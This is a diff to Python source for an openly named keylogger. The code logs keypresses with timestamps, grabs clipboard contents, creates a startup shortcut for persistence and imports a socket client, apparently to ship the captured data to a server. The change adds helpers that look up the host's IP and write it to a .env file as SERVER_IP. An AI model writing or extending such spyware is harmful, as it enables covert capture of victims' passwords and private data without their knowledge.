@@ -8,6 +8,7 @@ import win32com.client
 import threading
 import pyperclip
 from client import ClientSocket
+import socket
 
 class KeyLogger:
     def __init__(self):
@@ -33,6 +34,16 @@ class KeyLogger:
         if not self.check_startup():
             self.create_shortcut()
 
+    def get_ip(self):
+        hostname = socket.gethostname()
+        ip = socket.gethostbyname(hostname)
+        return ip
+        
+    def set_ip(self):
+        ip = self.get_ip()
+        with open(".env", "w+") as f:
+            f.write(f"SERVER_IP={ip}")
+
     def on_press(self, key):
         time = datetime.now().replace(microsecond=0)
         paste = pyperclip.paste()
@@ -50,5 +61,6 @@ class KeyLogger:
 
 if __name__ == "__main__":
     Logger = KeyLogger()
+    Logger.set_ip()
     threading.Thread(target=Logger.enable_startup())
     Logger.key_listener()
